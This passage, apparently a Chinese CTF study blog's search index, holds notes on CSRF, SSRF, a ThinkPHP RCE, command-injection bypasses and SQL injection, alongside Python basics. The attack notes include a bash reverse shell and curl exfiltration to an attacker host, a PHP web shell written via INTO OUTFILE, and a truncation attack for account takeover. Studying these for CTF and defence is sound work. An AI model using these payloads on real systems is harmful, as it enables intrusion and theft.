name=\"transfer\"　action=\"http://www.myBank.com/Transfer.php\">\n　　　　　　　　<input type=\"hidden\" name=\"toBankId\" value=\"11\">\n　　　　　　　　<input type=\"hidden\" name=\"money\" value=\"1000\">\n　　　　　　</form>\n　　　　</iframe>\n　　</body>\n</html>\n```\n\n或者完全伪造原表单，并且填写好内容，通过javascript直接提交\n\n```html\n<body>\n    <form method=\"post\" action=\"money.php\" id=\"mon\">\n        用户名：<input type=\"text\" name=\"user\" id=\"user\" value=\"Jlan\">\n        转账人：<input type=\"money\" name=\"money\" id=\"pass\" value=\"100000\">\n    </form>\n    <script>\n        document.getElementById(\"mon\").submit()\n    </script>\n</body>\n```\n\n#### SSRF：\n\n服务端请求伪造\n\n攻击流程：通过页面中可访问其他页面的位置通过服务端发起请求进而获取到客户端无法访问的内部系统\n\n攻击位置：有在线翻译，页面收藏，图片加载下载等\n","tags":["CTF","web"]},{"title":"Python面向对象","url":"/2022/01/11/Python面向对象/","content":"\n# Python面向对象\n\n#### 类的定义：\n\n```python\n#object是所有类的基类\n#每个对象会保存自己的属性，不同对象间属性没有必然联系\n#类内部可通过self操作\nclass 类名(object):\n  def 函数名(self):\n    方法内容\n\t\n```\n\n<!--more-->\n\n#### 类外操作对象属性：\n\n```python\n对象名.属性名=属性内容#给类添加或修改属性\n```\n\n#### 魔法方法：\n\n这类方法以双下划线开头和结尾，在满足某种特定条件是会调用这种方法\n\n```python\n#创建对象后会立即调用\n#使用时类似构造函数\n__init__(self,参数1,参数2)\n```\n\n```python\n#该方法返回值为字符串，在使用print(对象)时会自动调用\n#进行强制类型转换时也会自动调用\n__str__(self)\n```\n\n```python\n#对象在内存中被销毁时会调用\n#使用时类似析构函数，可使用del 变量名进行销毁\n__del__(self)\n```\n\n","tags":["Note","Python"]},{"title":"Python基础","url":"/2022/01/11/Python基础/","content":"\n# Python基础\n\n#### 数据类型：\n\nstring（字符串）\n\nnum（数字）\n\nbool（布尔）\n\nlist（列表）使用[    ]定义\n\ntuple（元组）使用{     }定义（无序）\n\ndictionary（字典）使用{     }定义，内容为：下标名:元素内容\n\n<!--more-->\n\n#### 字符串相关函数：\n\n###### 查找：\n\n```python\nstr.find(str1,start,end)//rfind从末尾开始查找\nstr.index(str1,start,end)//rindex从末尾开始查找\n```\n\n在字符串中查找是否存在str1，存在返回第一次出现的位置，不存在find返回-1，index报错\n\n```python\nstr.count(str1,start,end)\n```\n\n查找字符串中某字符串出现的次数\n\n###### 替换：\n\n```python\nstr.replace(old,new,count)\n```\n\n将字符串中old内容替换为new，count为最大替换次数，返回新字符串，不改变原来字符串\n\n###### 切割：\n\n```python\nstr.split(str1,count)\n```\n\n将字符串以str1为分隔切割，count为最大切割次数，返回一个列表，不改变原有字符串，默认按空白字符进行全切割\n\n###### 加入：\n\n```python\nstr.join(可迭代对象)\n```\n\n将str插入到可迭代对象两个元素之间，返回一个字符串\n\n###### 乱七八糟：\n\n```python\ncapitalize(str)//将字符串中第一个字母大写\ntitle(str)//字符串中每个单词首字母大写\nstr.startwith(str1)//检查字符串是否以str1开头\nstr.endwith(str1)//检查字符串是否以str1结尾\nstr.upper()//字母全大写\nstr.lower()//字母全小写\n```\n\n\n\n\n\ninput输入\n\nprint输出\n\nread读文件（按字节读），readline（按行读）\n\nopen(\"文件名\"，\"打开方式（r只读，w写入，a追加，（b）代表以二进制打开，（+）代表读写）\"，encoding=\"编码方式\")打开文件（以二进制进行读写时不能指定encoding方式）\n\n*args不定长参数，接收后生成元组\n\n**kwargs不定长参数，接收后生成字典\n\n#### Python内存管理机制：引用计数\n\n```python\na=1 #a地址引用为1\nb=a #a地址引用为2\ndel a #a地址引用为1\ndel b #a地址引用为0，此时a引用地址被销毁\n```\n\n","tags":["Python"]},{"title":"CTFShow 爆破web25","url":"/2022/01/08/CTFShow 爆破web25/","content":"\n# CTFShow 爆破web25\n\n首先查看代码\n\n```php\n<?php\nerror_reporting(0);\ninclude(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n?>\n```\n\n<!--more-->\n\n发现传入值有r，cookie需要进行伪造，先随便传入一个r，发现多次刷新后显示的值相同，说明随机数生成的结果相同，都是949254252\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web251.png)\n\n查询后得知\n\n```\nmt_srand()//以传入变量作为种子分发\nmt_rand()//以种子生成随机数\n```\n\n由于每次的seed相同，所以生成的随机数相同，尝试构造payload\n\n```\n?r=949254252 Cookie: token=1898508504\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web252.png)\n\n结果发现失败，查看提示，发现是在多次掉用mt_rand()时生成的随机数与种子有关但并不相等，所以不能简单用token=2*mt_rand()解决，使用提示中给出的脚本计算出seed，放入PHP环境中实验\n","tags":["CTF","web"]},{"title":"模版漏洞","url":"/2022/01/08/模版漏洞/","content":"\n# 模版漏洞\n\n### ThinkPHP V5漏洞：\n\n```url\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=PHP函数名&vars[1][]=PHP函数参数1&vars[1][]=PHP函数参数2\n```\n\n该漏洞可用于执行PHP函数\n\n<!--more-->\n","tags":["Note","CTF","web"]},{"title":"RCE远程代码执行","url":"/2022/01/08/RCE远程代码执行/","content":"\n# **RCE远程代码执行**\n\n#### **一、RCE能做到什么：**\n\n1、执行系统命令 2、记录用户输入 3、控制键盘鼠标 4、任意上传下载 5、截屏\n\n<!--more-->\n\n#### **二、RCE产生原因：**\n\n1、服务器上有木马 \n\n2、脆弱服务未授权\n\n3、通过数据库写木马 \n\n4、文件上传/文件包含 \n\n5、危险函数（eval，assert，system，shell_exec，exec，file_put_contents） \n\n6、命令执行 \n\n7、反序列化\n\n#### **三、RCE远程代码执行关键点：**\n\n##### **1、RCE黑名单过滤：**\n\nlinux执行命令特殊字符：（;分割命令）（&&在前一个命令执行成功的前提下执行后面命令）（||前一个命令执行失败的前提下执行后面命令）（|将前面命令执行的结果作为输入，输入到后面命令中执行）（``将命令执行结果作为命令再次执行）（$()和前一个一样）\n\n过滤空格后可使用<向命令传入参数，${IFS}为空格，%0a为分号转译\n\n`cat绕过可使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq`\n\n`绕过空格用%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flag绕过可使用通配符f*`\n\n##### **2、RCE无回显：**\n\n（1）、反弹shell：攻击端监听一个端口如：2333 \n\n​\t攻击端使用：\n\n```shell\nnc -lvp 监听的端口\n```\n\n​\t受害端使用如下命令生成一个反弹shell：\n\n```shell\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n```\n\n​\t在攻击端终端即可在受害端中执行命令\n\n（2）、dnslog：通过ping $(命令).域名 通过这种方式获取命令执行结果\n\n（3）、写文件：将命令执行结果写入到文件中，使用echo命令：\n\n```shell\necho \"写入内容\">test.txt\n```\n\n（4）、curl等网络命令：通过POST等方式直接给到个人私有VPS中\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3、RCE后发现不出网**\n\n（1）、写文件\n\n（2）、命令盲注：命令||sleep 100\n\n（3）、隐蔽信道\n\n##### 4、字符绕过\n\n（1）、\n\n```\n使用''或\"\"隔断字符串\n```\n\n（2）、空格可使用：<，<>，${IFS}，$IFS，%20(space)，%09(tab)，$IFS$9，$IFS$1 替换\n\n（3）、分号可使用：%0a，%0d，%0D，%0A 替换\n\n（4）、使用base64编码：Y2F0IGZsYWcucGhw|base64，将其中内容解码后执行\n\n（5）、使用`反引号包裹命令，将其中内容作为前一命令的输入\n\n##### 5、可用于执行系统命令的函数\n\nexec()、passthru()、system()、shell_exec()\n","tags":["Note","web","RCE"]},{"title":"SQL注入笔记","url":"/2022/01/08/SQL注入笔记/","content":"\n# **SQL注入**\n\n1、通过order by爆出字段数\n\n2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置\n\n3、information_schema数据库，为mysql自带数据库，提供数据库源数据访问，最常用的是\n\n**TABLES表**：提供了关于数据库中表的信息\n\n**COLUMNS表**：提供了表中列的信息\n\n<!--more-->\n\n爆破库名：\n\n```mysql\nunion select 1,2,database()\n//靠错误爆出库名\nand exists(select * from aaa)\n//aaa表并不存在，此时会报错停止并返回数据库名.aaa\n```\n\n爆破表名：\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from 表名)//爆破出表名\n```\n\n爆破列名：\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"想查询的表名\"\nand exists(select 列名 from 已知表名)//爆破出列名\n```\n\n4、报错注入\n\n（1）updatexml：更新XML文档的函数\n\n语法：**updatexml（文档类型，xpath路径，更新的内容）**\n\n例子：\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),’1’)\n```\n\n0x0a代表换行符，concat拼接\n\n拼接目的为使得查询结果能完全显示出来\n\n（2）extractvalue：对XML文档进行查询的函数\n\n语法：**extractvalue（文档类型，xpath路径）**\n\n报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\n提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分\n\n​\t例题：CTFHub技能树web-SQL注入-报错注入\n\n​\t![SQLError](/images/quiz/SQLError.png)\n\n​\t首先爆破库表列名\n\n​\t![SQLError2](/images/quiz/SQLError2.png)\n\n​\t进而发现flag过长用substr切割\n\n​\t![SQLError3](/images/quiz/SQLError3.png)\n\n​\t得到flag\n\n5、盲注：\n\n布尔盲注：回显只有两种情况，一种有一种无\n\nif表达式：if(expr1,expr2,expr3)\n\nexpr1为真就返回expr2（可用于执行函数）\n\nsubstr函数：substr(字符串,起始位置,截取长度)\n\nascii函数：将函数内字符以ascii表转换为数字，而后可以进行判断\n\n\n\n时间盲注：无回显，可以通过sleep函数判断是否为时间盲注\n\n~~建议直接sqlmap~~\n\n（1）、sleep函数看延迟时间\n\n（2）、benchmark(执行次数,方式)，执行超多次看延迟时间\n\n6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取\n\n7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)\n\n写入：\n\n```mysql\nselect ‘<?php eval($_POST[cmd]);?>’ into outfile或dumpfile '绝对路径';//建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行\n```\n\n8、关键词绕过：通过\n\n（1）、set@a：设定一个语句变量 set@sql=0x16进制数\n\n（2）、prepare : 存储一个sql语句 存到execsql 里面 prepare execsql from @sql\n\n（3）、execute :执行一个sql语句 execute execsql\n\n由于设定语句变量时，mysql会自动将16进制数据转换为文字\n\n9、零碎\n\n```mysql\nto_base64(内容)//该语句将内容经过base64编码后输出\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/可代替空格\n```\n\n```\n--+，%23，#将后面的语句注释\n```\n\n10、SQL约束攻击\n\n在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：\n\n```sql\nSELECT userId from user where username = 'test            '//看这里有很多空格\n```\n\n上述代码和username = 'test'结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“**字符串比较**”期间进行的。这是因为，**SQL会在内部使用空格来填充字符串**，**以便在比较之前使其它们的长度保持一致**。\n\n在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。\n\n```php\n//注册示例代码\n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\n这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。\n\n主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将\"admin+[大量空格]11\"删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。\n\n如果使用用户名“vampire”和密码“random_pass”登录的话，对比时是admin与admin+[大量空格]，会将前面的admin添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?\n\n当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。\n","tags":["Note","web","SQL"]},{"title":"CTF零碎笔记","url":"/2022/01/08/CTF零碎笔记/","content":"\n# 零碎笔记\n\nmt_srand( )该函数在PHP4.2.0之前传入任意参数后生成的都是伪随机数，在任何机器上只要运行的同样的seed参数结果都相同\n\n<!--more-->\n\nKindEditor编辑器漏洞，在使用该编辑器是在url末尾加上/php/file_manager_json.php?path=路径，就会便利路径中所有内容，特征为前端代码中有对php/file_manager_json.php的引用\n\n###### md5弱相等绕过：\n\n1、构造数组a[]=xxxx&b[]=xxxx\n\n2、弱相等时转换为相同数据类型，0e开头的字符串会被转为0，字符串如下\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n\n\n\n## 序列化与反序列化：\n\n#### 序列化：\n\n将一个对象转化为一个有序的字符串\n\n#### 序列化格式：\n\n结构类型:\n\n```php\n对象名长度:\"对象名\":类中项目数量:{项目1类型:项目1长度:”项目1内容”;项目2类型:项目2长度:”项目2内容”;} \n```\n\n例子：\n\n```php\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n//O代表对象类型，s代表字符串类型\n```\n\n#### 序列化有关函数：\n\n```php\nserialize(对象)//将对象进行序列化，返回一个字符串\n```\n\n```php\nunserialize(字符串)//将对应字符串进行反序列化操作，返回一个类\n```\n\n```php\n__wakeup()//该函数为类内函数，如果序列化中对象属性个数的值大于真是个数时就会跳过该函数执行\t\n```\n\n","tags":["Note","web"]},{"title":"CTF","url":"/2022/01/08/CTF/","content":"\nJlan的CTF之旅从现在开始了\n","tags":["Note"]}]